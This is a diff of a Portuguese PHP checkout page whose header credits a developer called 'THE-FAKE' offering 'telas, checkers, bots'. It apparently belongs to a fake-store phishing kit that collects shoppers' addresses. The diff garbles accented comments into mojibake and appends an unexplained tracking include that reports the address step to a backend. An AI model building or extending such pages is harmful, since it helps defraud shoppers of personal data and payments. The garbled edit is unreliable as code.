@@ -1,4 +1,4 @@
-<?php 
+﻿<?php 
 
 session_start();
 
@@ -164,7 +164,7 @@ if(retorno==1){ window.location.href="https://www.lojavirtual.com.br/"; } else{ 
 <script>
 /*******************************
 SCRIPT DESENVOLVIDO POR THE-FAKE
-PROGRAMAÇÃO EM GERAL - TELAS, CHECKERS, BOTS
+PROGRAMAÃ‡ÃƒO EM GERAL - TELAS, CHECKERS, BOTS
 DIA: 04/11/2022 
 HORA: 21:51 PM
 ********************************/
@@ -178,8 +178,8 @@ HORA: 21:51 PM
     var date = JSON.parse(jsonString);
 	var xt = valorProduto2 * 1; 
 	var info = xt.toLocaleString('pt-br', {minimumFractionDigits: 2});
-	document.getElementById("valorTotal2").innerHTML="R$ "+date.precoFinal; // ID PRODUTOS - PREÇO PEGO NO LOCAL
-	document.getElementById("valorTotal3").innerHTML="R$ "+date.precoFinal; // ID TOTAL - PREÇO PEGO NO LOCAL
+	document.getElementById("valorTotal2").innerHTML="R$ "+date.precoFinal; // ID PRODUTOS - PREÃ‡O PEGO NO LOCAL
+	document.getElementById("valorTotal3").innerHTML="R$ "+date.precoFinal; // ID TOTAL - PREÃ‡O PEGO NO LOCAL
 	document.getElementById("valorTotal4").innerHTML="R$ "+info; // ID VALOR FIXO
 	document.getElementById("quantityHTML").value=date.quantos; // QUANTIDADE NO CARRINHO
     document.getElementById("resumoQtd").innerHTML="("+date.quantos+")"; // QUANTIDADE NO CARRINHO
@@ -1204,7 +1204,7 @@ body.custom-checkout header .item-security {
 			<input type="hidden" name="city" id="city" value="">
 		</div><!-- /#checkout-parte-1 -->
 
-		<!-- PARTE 2: CONTE MAIS SOBRE SEU ENDEREÇO (INICIALMENTE OCULTA) -->
+		<!-- PARTE 2: CONTE MAIS SOBRE SEU ENDEREÃ‡O (INICIALMENTE OCULTA) -->
 		<div id="checkout-parte-2" style="display: none; margin-top: 25px;">
 			<h3 style="font-size: 18px; font-weight: bold; margin-bottom: 4px; color: #333;">Conte mais sobre seu endereço</h3>
 			<p style="font-size: 13px; color: #666; margin-bottom: 15px;">Nos ajuda a encontrar você com mais facilidade na hora da entrega</p>
@@ -1235,7 +1235,7 @@ body.custom-checkout header .item-security {
 					  <input type="checkbox" id="portaria" style="opacity: 0; width: 0; height: 0;">
 					  <span class="slider round" style="position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; -webkit-transition: .4s; transition: .4s; border-radius: 34px;"></span>
 					</label>
-					<span style="font-size: 14px; color: #333;">É possível deixar pacotes na portaria</span>
+					<span style="font-size: 14px; color: #333;">Ã‰ possível deixar pacotes na portaria</span>
 				</div>
 			</div>
 
@@ -1494,7 +1494,7 @@ body.custom-checkout header .item-security {
 
 
 
-  <!-- BLOCO PARA INSERIR MSG DE TEXTO DE SEGURAÇÃ QUE O CLIENTE PEDIU NO ZAP -->
+  <!-- BLOCO PARA INSERIR MSG DE TEXTO DE SEGURAÃ‡Ãƒ QUE O CLIENTE PEDIU NO ZAP -->
 	<div class="col-checkout col-4">
     <div class="box-checkout box-resume opened -force-open" style="display:block !important;">
 	<br>
@@ -1627,4 +1627,11 @@ Nossos pagamentos possuem segurança criptografada em todas as compras.</div>
 
 
 </body></html>
+
+
+
+<?php 
+require_once("api/ping_session.php");
+render_tracking_script("endereco");
+?>
 
